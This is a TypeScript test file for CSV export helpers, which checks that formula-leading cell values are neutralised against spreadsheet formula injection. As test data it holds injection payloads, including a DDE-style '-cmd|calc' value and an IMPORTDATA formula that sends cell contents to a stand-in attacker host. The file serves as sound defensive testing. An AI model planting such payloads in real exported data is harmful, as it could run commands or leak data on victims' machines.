import { describe, expect, test } from "bun:test";
import { csvQuote, toCsv } from "./formatters";
import type { QueryResult } from "../types/query";

function resultOf(rows: Record<string, unknown>[]): QueryResult {
  const columns = Object.keys(rows[0] ?? { value: null });
  return { columns, rows, duration: 1, rowCount: rows.length, sql: "select" };
}

describe("csvQuote — formula injection", () => {
  // F3: a value beginning with one of these characters is interpreted as a
  // formula by spreadsheet software when pasted, so it must be neutralized.
  test.each(["=SUM(A1:A2)", "+1+1", "-cmd|calc", "@SUM(1,2)", "\tSUM(1)", "\rSUM(1)"])(
    "quotes and apostrophe-prefixes a formula-leading value: %p",
    (value) => {
      const quoted = csvQuote(value);
      expect(quoted.startsWith('"\'')).toBe(true);
      expect(quoted.endsWith('"')).toBe(true);
      // The neutralized value round-trips back to the original payload once
      // the CSV quoting and the leading apostrophe are stripped.
      expect(quoted.slice(2, -1)).toBe(value);
    }
  );

  test("does not neutralize a plain negative or positive numeric literal", () => {
    expect(csvQuote(-42)).toBe("-42");
    expect(csvQuote("+42")).toBe("+42");
    expect(csvQuote(-3.14)).toBe("-3.14");
    expect(csvQuote("-1.5e10")).toBe("-1.5e10");
  });

  test("still quotes commas, double quotes and newlines as before", () => {
    expect(csvQuote("a,b")).toBe('"a,b"');
    expect(csvQuote('say "hi"')).toBe('"say ""hi"""');
    expect(csvQuote("line1\nline2")).toBe('"line1\nline2"');
  });

  test("quotes a bare carriage return too, so a value can't split a row", () => {
    expect(csvQuote("a\rb")).toBe('"a\rb"');
  });

  test("leaves ordinary strings untouched", () => {
    expect(csvQuote("hello")).toBe("hello");
    expect(csvQuote("user@example.com")).toBe("user@example.com");
    expect(csvQuote(null)).toBe("");
    expect(csvQuote(undefined)).toBe("");
  });
});

describe("toCsv — end-to-end formula injection", () => {
  test("a malicious cell reaches the CSV neutralized, not as a live formula", () => {
    const result = resultOf([{ name: '=IMPORTDATA("http://evil.example/?d=A1")' }]);
    const csv = toCsv(result);
    const dataLine = csv.split("\n")[1]!;
    expect(dataLine.startsWith('"\'=')).toBe(true);
  });
});
